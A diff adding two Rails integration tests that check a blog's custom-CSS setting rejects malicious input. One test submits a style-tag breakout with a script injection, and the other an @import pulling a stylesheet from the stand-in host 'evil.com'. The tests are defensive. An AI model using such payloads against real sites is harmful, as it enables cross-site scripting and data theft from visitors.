@@ -169,4 +169,26 @@ class App::Settings::AppearanceControllerTest < ActionDispatch::IntegrationTest
     assert_redirected_to app_settings_url
     assert_nil @blog.reload.custom_css
   end
+
+  test "should show validation error for malicious custom css" do
+    @blog.update(features: [ "custom_css" ])
+    malicious_css = ".blog { color: red; }</style><script>alert(1)</script>"
+
+    patch app_settings_appearance_url(@blog), params: { blog: { custom_css: malicious_css } }, as: :turbo_stream
+
+    assert_response :unprocessable_entity
+    assert_select ".text-red-500", text: /contains invalid content/
+    assert_select "textarea.\\!border-red-500"
+  end
+
+  test "should show validation error for invalid @import" do
+    @blog.update(features: [ "custom_css" ])
+    invalid_css = '@import url("https://evil.com/steal.css");'
+
+    patch app_settings_appearance_url(@blog), params: { blog: { custom_css: invalid_css } }, as: :turbo_stream
+
+    assert_response :unprocessable_entity
+    assert_select ".text-red-500", text: /contains invalid content/
+    assert_select "textarea.\\!border-red-500"
+  end
 end
